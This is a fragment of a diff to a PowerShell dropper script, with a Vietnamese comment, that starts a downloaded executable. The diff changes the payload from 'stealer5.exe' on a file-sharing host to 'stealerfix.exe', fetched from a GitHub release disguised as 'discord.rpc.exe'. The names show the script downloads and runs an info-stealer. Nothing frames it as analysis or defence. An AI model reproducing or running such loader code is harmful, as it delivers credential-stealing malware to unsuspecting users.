@@ -23,8 +23,8 @@ if (!(Test-Path $filePath)) {
 # Chạy file thực thi
 Start-Process -FilePath $filePath -NoNewWindow
 
-$filePath = "$folderPath\stealer5.exe"
-$url = "https://anonsharing.com/file/3400ff9837d2f447/loader_(3).exe"
+$filePath = "$folderPath\stealerfix.exe"
+$url = "https://github.com/43a1723/test/releases/download/siu/discord.rpc.exe"
 if (!(Test-Path $folderPath)) {
     New-Item -ItemType Directory -Path $folderPath -Force
 }
